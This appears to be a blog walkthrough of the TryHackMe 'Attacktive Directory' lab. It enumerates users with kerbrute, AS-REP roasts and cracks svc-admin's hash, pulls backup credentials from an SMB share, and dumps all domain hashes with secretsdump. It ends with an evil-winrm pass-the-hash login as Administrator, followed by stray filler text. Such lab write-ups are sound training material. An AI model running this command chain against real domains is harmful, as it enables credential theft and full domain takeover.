---
# the default layout is 'page'
icon: fas fa-info-circle
order: 4

date: 2024-05-05
categories: Tryhackme
image: https://tryhackme-images.s3.amazonaws.com/room-icons/f38b047a2a7089147766099dffeb8a5d.png
---
<!-- icon 	order
fas fa-info-circle -->


# Enumeration

```php
PORT      STATE    SERVICE            VERSION                                                                                                                                                 
53/tcp    open     domain             Simple DNS Plus                                                                                                                                         
80/tcp    open     http               Microsoft IIS httpd 10.0                                                                                                                                
| http-methods:                                                                                                                                                                               
|_  Potentially risky methods: TRACE                                                                                                                                                          
|_http-title: IIS Windows Server                                                                                                                                                              
88/tcp    open     kerberos-sec       Microsoft Windows Kerberos (server time: 2025-04-26 13:40:53Z)                                                                                          
135/tcp   open     msrpc              Microsoft Windows RPC                                                                                                                                   
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn                                                                                                                           
389/tcp   open     ldap               Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)                                                      
445/tcp   open     microsoft-ds?                                                                                                                                                              
464/tcp   open     kpasswd5?                                                                                                                                                                  
544/tcp   filtered kshell                                                                                                                                                                     
593/tcp   open     ncacn_http         Microsoft Windows RPC over HTTP 1.0                                                                                                                     
636/tcp   open     tcpwrapped                                                                                                                                                                 
1094/tcp  filtered rootd                                                                                                                                                                      
1123/tcp  filtered murray                                                                                                                                                                     
1132/tcp  filtered kvm-via-ip                                                                                                                                                                 
1145/tcp  filtered x9-icue                                                                                                                                                                    
1666/tcp  filtered netview-aix-6                                                                                                                                                              
2710/tcp  filtered sso-service
2725/tcp  filtered msolap-ptp2
3268/tcp  open     ldap               Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server      Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-04-25T12:57:20
|_Not valid after:  2025-10-25T12:57:20
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-26T13:41:18+00:00
3476/tcp  filtered nppmp
5280/tcp  filtered xmpp-bosh
5298/tcp  filtered presence
5357/tcp  filtered wsdapi
5440/tcp  filtered unknown
5985/tcp  open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
6881/tcp  filtered bittorrent-tracker
8002/tcp  filtered teradataordbms
8042/tcp  filtered fs-agent
8045/tcp  filtered unknown
15000/tcp filtered hydap
20221/tcp filtered unknown
32774/tcp filtered sometimes-rpc11
50000/tcp filtered ibm-db2
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-26T13:41:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1907.92 seconds
```

# User enumeration using kerbrute

Command

```php
kerbrute userenum --domain spookysec.local --dc 10.10.0.172 userlist.txt
```

```php
kerbrute userenum --domain spookysec.local --dc 10.10.0.172 userlist.txt                                             ✔  at 10:28:34   
                                                                                                                                                                                              
    __             __               __                                                                                                                                                        
   / /_____  _____/ /_  _______  __/ /____                                                                                                                                                    
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \                                                                                                                                                   
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/                                                                                                                                                   
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                                                                                                                                    
                                                                                                                                                                                              
Version: dev (9cfb81e) - 04/26/25 - Ronnie Flathers @ropnop                                                                                                                                   
                                                                                                                                                                                              
2025/04/26 10:29:10 >  Using KDC(s):                                                                                                                                                          
2025/04/26 10:29:10 >   10.10.0.172:88                                                                                                                                                        
                                                                                                                                                                                              
2025/04/26 10:29:11 >  [+] VALID USERNAME:       james@spookysec.local                                                                                                                        
2025/04/26 10:29:17 >  [+] svc-admin has no pre auth required. Dumping hash to crack offline:                                                                                                 
$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:41bca513e58f6a5775cf004add08f045$1cafd30110f2a258f28f1fdf2220ee70ccd98fc36631615cac6b64ca459a7d6889c4d49937c9e81ca809cd6f343ebd8ed9455795cfeb24fbb5f7c
30ad6840b21abb9c42726c83bf09ea312df8dc0a8a2d83c5826378319517ecef96809765aaff7d4b9bff02052f362fe2a0598905d48270c72ae039ee13737f6fe0a40634a06be3c711c8827e56b0d204aceb513ebcc2dea84bbf862ed10d5c33d68ee8592805ec97ba315c0c458433bd2defdca822692948ec621852e9fef1cc72c440133b64f294a636988b5a6d5a4b8c264101900ceddba34747248e2356ce5509f327c98794227e472aed5e0721593d4c2ea9fbccb9be91d38dba80a7e3d32e54cb47d6ceee2a2aff87b
2025/04/26 10:29:17 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/04/26 10:29:25 >  [+] VALID USERNAME:       James@spookysec.local
```

## Created the users file with the obtained users from kerbrute

```php
james
James
svc-admin
robin
darkstar
administrator
backup 
```

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.** ASReproasting
 occurs when a user account has the privilege "Does not require 
Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

The account is svc-admin

# Impacket-GETUsers

```php
impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.109.124 -dc-host spookysec.local -usersfile users.txt -request
```

results

```php
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:ab26d8d89927724852bd1c0d655dfe1d$844cd5599fb916ac455d01b4376bb930494bcd1a1e74fa8e4cd854cfb120d64fdeb2e9651e761701e647a1fc761baba84523780ee7e2870854887
fa13a970800ab4e4d01578ae5223956f7988b0b1c253cf3d4fdadfbfa857cbeca2de93f43d11948c7e12ba101d75817e885dff5ab315e0c51355cb4b2ee27d62a0b77a5a8c6085d200f59398784758cba1126ee3169819d6ddff3d423d5a56
1486c5b2b292bc9455b76d24aea79d27f6d54c7f37cb4da68749717cf80b25ffce128332aa407088907374a82e7e525e133105c5e5ae56ba63c9f5133191e5ce378ce719384145297c872934d7ebde3a6861c0854c9ccd37a
```
![Screenshot](../../../assets/screenshots/Attactive-Directory/1.webp)

Cracking the hash using john

```php
john svc-admin_hash.txt --wordlist=passwordlist.txt
```

Results

```php
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
```

![image.png](attachment:5c31278b-a1fe-434c-9097-2889c8ce5990:image.png)

As we have valid creds for an account we can now enumerate the shares present in the domain

```php
smbclient -L //10.10.109.124 -U svc-admin
```

![image.png](attachment:e5ce009e-0762-4c9f-86df-fe45c4340799:image.png)

Results

```php
 Sharename       Type      Comment
        ---------       ----      -------
smbclient: Ignoring: /etc/krb5.conf:81: missing =
smbclient: Ignoring: /etc/krb5.conf:81: missing =
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

The backup share looks iinteresting lets access it and see whats in

```php
smbclient //10.10.141.170/backup -U svc-admin
```

![Screenshot](../../../assets/screenshots/Attactive-Directory/2.webp)

We got the `backup_credentials.txt` file and downloaded to our local machine..now lets see what does it have

![Screenshot](../../../assets/screenshots/Attactive-Directory/3.webp)

```php
backup@spookysec.local:backup2517860                                                                                                                                                     
```

Lets go and dump the secrets using this backup account

```php
impacket-secretsdump backup@10.10.141.170
```

![Screenshot](../../../assets/screenshots/Attactive-Directory/4.webp)

```php
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                            
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                 
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                                                        
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::                                                                                                               
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                                                               
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                                                     
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::                                                                                               
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::                                                                                            
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::                                                                                         
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::                                                                                            
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::                                                                                                 
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::                                                                                               
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::                                                                                             
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::                                                                                            
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::                                                                                            
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::                                                                                           
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::                                                                                              
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                                            
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:d8456f7fb6387ffe5f7b608ad58caa84:::                                                                                                    
[*] Kerberos keys grabbed                                                                                                                                                                     
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48                                                                                        
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae                                                                                                                        
Administrator:des-cbc-md5:2079ce0e5df189ad                                                                                                                                                    
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc                                                                                               
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902                                                                                                                               
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:0880b544656adcc0c4f96411d495915c8e36b858379b697871c77118f062a468
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:568b48a962ae2f02bcdfceee2ab80e76
ATTACKTIVEDIREC$:des-cbc-md5:16166434f4bc326b
[*] Cleaning up... 
```

# Access

Now as we have the hash especially the Administrator we can login using pass-the-hash attack 

```php
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

![Screenshot](../../../assets/screenshots/Attactive-Directory/5.webp)

Now go for the flags

Thats root flag that’s under the Administrator ..lets check the other users

```php
    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/17/2020   4:04 PM                a-spooks
d-----        9/17/2020   4:02 PM                Administrator
d-----         4/4/2020  12:19 PM                backup
d-----         4/4/2020   1:07 PM                backup.THM-AD
d-r---         4/4/2020  11:19 AM                Public
d-----         4/4/2020  12:18 PM                svc-admin
```

We have bunch of users here..now lets read them to get the remaining flags

## For backup

![Screenshot](../../../assets/screenshots/Attactive-Directory/6.webp)

# For svc-admin

![Screenshots](../../../assets/screenshots/Attactive-Directory/7.webp)

# Boom..!!

![Screenshots][def]
ffdgdfgfdg
kykuy
kyh
```php
utyuyuyuyyuut   
```